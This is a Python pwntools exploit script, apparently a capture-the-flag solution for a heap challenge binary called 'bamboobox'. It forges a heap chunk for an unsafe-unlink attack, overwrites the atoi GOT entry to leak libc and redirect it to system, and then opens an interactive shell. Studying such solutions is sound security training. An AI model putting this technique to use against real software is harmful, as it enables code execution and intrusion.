#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'amd64'
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./bamboobox")
elf = ELF("./bamboobox")
libc = elf.libc

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def show():
    io.sendlineafter(":", "1")

def add(length, name):
    io.sendlineafter(":", "2")
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)

def change(idx, length, name):
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)

def remove(idx):
    io.sendlineafter(":", "4")
    io.sendlineafter(":", str(idx))

def exit():
    io.sendlineafter(":", "5")

if __name__ == "__main__":
    add(0x40, '0' * 8)
    add(0x80, '1' * 8)
    add(0x40, '2' * 8)
    ptr = 0x6020c8

    fakeChunk = flat([0, 0x41, ptr - 0x18, ptr - 0x10, cyclic(0x20), 0x40, 0x90])
    change(0, 0x80, fakeChunk)
    remove(1)
    payload = flat([0, 0, 0x40, elf.got['atoi']])
    change(0, 0x80, payload)
    show()
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
    success("libc.address -> {:#x}".format(libc.address))
    #  libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00')) - libc.sym['atoi']
    #  success("libcBase -> {:#x}".format(libcBase))
    pause()

    change(0, 0x8, p64(libc.sym['system']))
    #  change(0, 0x8, p64(libcBase + libc.sym['system']))
    io.sendline('$0')

    io.interactive()
    io.close()
